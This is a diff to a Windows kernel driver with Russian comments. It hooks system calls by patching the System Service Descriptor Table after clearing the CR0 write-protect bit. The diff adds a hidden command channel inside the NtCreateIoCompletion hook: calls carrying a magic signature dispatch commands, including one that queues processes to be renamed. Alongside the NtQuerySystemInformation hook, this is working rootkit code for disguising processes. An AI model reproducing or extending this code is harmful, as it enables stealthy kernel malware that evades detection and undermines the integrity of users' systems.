@@ -1,6 +1,7 @@
 #include <ntddk.h>
 #include "cr0.h"
 #include "rename_proc.h"
+#include "command.h"
 
 typedef struct _KSERVICE_TABLE_DESCRIPTOR {
     PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
@@ -48,15 +49,17 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
-    WriteCR0(reg);
-
-    reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
     WriteCR0(reg);
 
+    // Init task list for rename process
+    ExInitializePagedLookasideList(&glPagedTaskQueue, NULL, NULL, 0, sizeof(TASK_QUEUE), ' LFO', 0);
+    InitializeListHead(&glTaskQueue);
+
+
+
+
     dob->DriverUnload = DriverUnload;
-
-
     return STATUS_SUCCESS;
 }
 
@@ -70,16 +73,14 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
-    WriteCR0(reg);
-
-    reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
     WriteCR0(reg);
 
+    FreeListQueue();
+    ExDeletePagedLookasideList(&glPagedTaskQueue);
+
     return;
 }
-
-
 
 ULONG_PTR HookNtCreateIoCompletion(
     ULONG_PTR	arg_01,
@@ -87,10 +88,36 @@ ULONG_PTR HookNtCreateIoCompletion(
     ULONG_PTR	arg_03,
     ULONG_PTR	arg_04)
 {
+    PCOMMAND pCmd;
     NTSTATUS retStatus;
     
     if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
-        DbgPrint("COOOOOOOOOOOOOOOOOOL\n");
+        pCmd = (PCOMMAND)arg_02;
+        switch (pCmd->type)
+        {
+        case TestCommand: {
+            DbgPrint("HookNtCreateIoCompletion execute\n");
+            break;
+        }
+        case RenameProcess: {
+            PLIST_ENTRY pLink;
+            ULONG len;
+
+            DbgPrint("RenameProcess PID:%d Name:%s\n", pCmd->bufInt, (PCHAR)pCmd->bufByte);
+
+            TaskQueueProcess(pCmd->bufInt, (PCHAR)pCmd->bufByte);
+
+
+            for (pLink = glTaskQueue.Flink; pLink != &glTaskQueue; pLink = pLink->Flink) {
+                PTASK_QUEUE task = CONTAINING_RECORD(pLink, TASK_QUEUE, link);
+                DbgPrint("NAME %s PID %d\n", task->name, task->pid);
+            }
+            break;
+        }
+        default:
+            DbgPrint("No dispatch for command %d\n", pCmd->type);
+            break;
+        }
     }
     else {
         retStatus = glRealNtCreateIoCompletion(
@@ -100,9 +127,10 @@ ULONG_PTR HookNtCreateIoCompletion(
             arg_04
         );
 
-        DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
-            arg_01, arg_02, arg_03, arg_04);
+        //DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
+        //    arg_01, arg_02, arg_03, arg_04);
     }
 
     return retStatus;
 }
+
